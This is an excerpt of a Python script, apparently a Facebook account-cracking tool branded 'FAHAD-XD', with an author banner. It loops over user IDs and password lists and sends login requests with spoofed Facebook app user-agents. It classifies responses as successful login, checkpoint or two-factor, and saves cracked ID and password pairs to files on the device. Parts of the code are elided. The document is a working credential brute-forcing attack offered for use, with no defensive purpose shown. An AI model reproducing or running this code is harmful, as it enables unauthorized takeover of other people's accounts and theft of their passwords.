...
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : ZIDAN MAHAMUD
\x1b[1;97m> Github : Zidan-mahamud
\x1b[1;97m> Facebok: Zida'n Mahamu'd
\x1b[1;97m> Version: 1.0.3
\033[1;37m---------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [FAHAD-OK] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/FAHAD/FAHAD-OK.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif 'checkpoint' in response.text:
                print('\r{}\033[1;91m[Checkpiont] {} {} {} {}'.format(G, url, fax, px, mys))
                cpu.append(url)
                open('/sdcard/FAHAD/FAHAD-CP.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[2F-FAHAD] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/FAHAD/FAHAD-2F.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r{} [FAHAD-XD] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[FAHAD-XD] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [FAHAD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FAHAD/FAHAD-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/FAHAD/FAHAD-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
